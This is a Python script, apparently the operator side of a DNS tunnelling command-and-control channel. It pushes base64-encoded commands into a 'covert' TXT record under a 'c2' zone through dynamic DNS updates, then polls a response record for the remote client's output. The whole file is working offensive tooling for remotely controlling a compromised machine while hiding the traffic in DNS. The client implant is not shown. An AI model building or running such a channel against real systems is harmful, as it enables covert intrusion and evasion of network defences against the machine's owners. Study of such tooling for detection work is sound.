import dns.update
import dns.query
import dns.resolver
import time
import base64

# sleep time between checking response record
SLEEP_TIME = 1

# time to wait for response from the client
TIMEOUT = 30

# pre-decided zone and record names
ZONE = 'c2.netres.com.'
COMMAND_RECORD = 'command.c2.netres.com.'
RESPONSE_RECORD = 'response.c2.netres.com.'

# must provide the IP address of the DNS server
DNS_IP = '192.168.243.141'

# update the covert record with the next command we want the client to run
def update_record(record: str, msg: str) -> str:
    if msg != '':
        encoded_msg = base64.b64encode(msg.encode()).decode()
    else:
        encoded_msg = msg

    update = dns.update.Update(ZONE)
    update.delete(record, 'TXT')
    update.add(record, 60, 'TXT', encoded_msg)

    response = dns.query.tcp(update, DNS_IP)
    return response


def main():
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [DNS_IP]

    while True:
        command = input('Enter a command: ')
        response = update_record(COMMAND_RECORD, command)

        if "SERVFAIL" in str(response):
            print('Something went wrong :(')
            continue

        print('Command set. Waiting for response...')
        start_time = time.time()
        while time.time() - start_time < TIMEOUT:
            time.sleep(SLEEP_TIME)
            client_response = resolver.resolve(RESPONSE_RECORD, 'TXT')
            full_client_text = ''
            for response in client_response:
                text_response = response.to_text().strip('"')
                full_client_text += text_response
            decoded_response = base64.b64decode(full_client_text).decode()
            
            if decoded_response != '""':  # client returned a response
                # reset the field to be empty
                print(decoded_response, '\n')
                update_record(RESPONSE_RECORD, '""')
                update_record(COMMAND_RECORD, '""')
                break
        else:  #  timeout received
            print('Response timed out from client\n')


if __name__ == '__main__':
    main()

